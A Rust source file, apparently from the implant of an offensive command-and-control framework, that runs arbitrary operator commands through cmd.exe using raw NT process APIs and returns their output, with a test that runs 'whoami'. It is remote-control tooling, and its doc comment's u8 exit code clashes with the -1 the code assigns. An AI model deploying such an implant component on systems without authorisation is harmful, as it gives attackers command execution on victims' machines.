use kageshirei_communication_protocol::communication::TaskOutput;
use mod_win32::{nt_ps_api::nt_create_process_w_piped, nt_time::current_timestamp};

/// Executes a command in a new process using `cmd.exe`.
///
/// This function spawns a new process using `nt_create_process_w_piped` to execute the
/// specified command via `cmd.exe /c`. The output of the command is captured and returned
/// in the `TaskOutput`. If the command produces no output, an error is recorded in the
/// `TaskOutput`.
///
/// # Parameters
/// - `cmdline`: A string slice representing the command to be executed.
///
/// # Returns
/// - `TaskOutput`: A structure containing details of the command execution, including:
///   - `output`: The output of the executed command as a `String`.
///   - `exit_code`: An `Option<u8>` representing the success or failure status (0 for success,
///     non-zero for failure).
///   - `started_at` and `ended_at`: Timestamps marking the start and end of the operation.
///   - Additional metadata captured during the execution.
pub fn command_shell(cmdline: &str) -> TaskOutput {
    let mut output = TaskOutput::new();
    output.started_at = Some(current_timestamp());

    let target_process = "C:\\Windows\\System32\\cmd.exe"; // Path to cmd.exe
    let cmd_prefix = "cmd.exe /c"; // Prefix to execute the command

    // Use `nt_create_process_w_piped` to create a new process and execute the command.
    // This returns a `Vec<u8>` containing the output.
    let result = unsafe {
        nt_create_process_w_piped(
            target_process,                                 // Path to cmd.exe
            format!("{} {}", cmd_prefix, cmdline).as_str(), // Full command to execute
        )
    };

    // Check if the output is empty
    if result.is_empty() {
        output.ended_at = Some(current_timestamp());
        output.exit_code = Some(-1); // Error case
        return output;
    }

    // Convert the output (a byte vector) to a String, ensuring proper UTF-8 formatting
    let output_str = String::from_utf8_lossy(&result);

    // Set the output string (converted to a full String)
    output.output = Some(output_str.into_owned());
    output.ended_at = Some(current_timestamp());
    output.exit_code = Some(0); // Success case
    output
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shell() {
        // Test executing a simple command
        let cmd = "whoami";
        let result = command_shell(cmd);

        // Ensure the command was successful (exit_code == 0)
        assert!(
            result.exit_code == Some(0),
            "Expected exit_code = 0, but got: {:?}",
            result.exit_code
        );

        // Ensure the output is not empty
        let output_str = result.output.as_ref().unwrap();
        assert!(
            !output_str.is_empty(),
            "Expected non-empty output, but got an empty string"
        );
    }
}
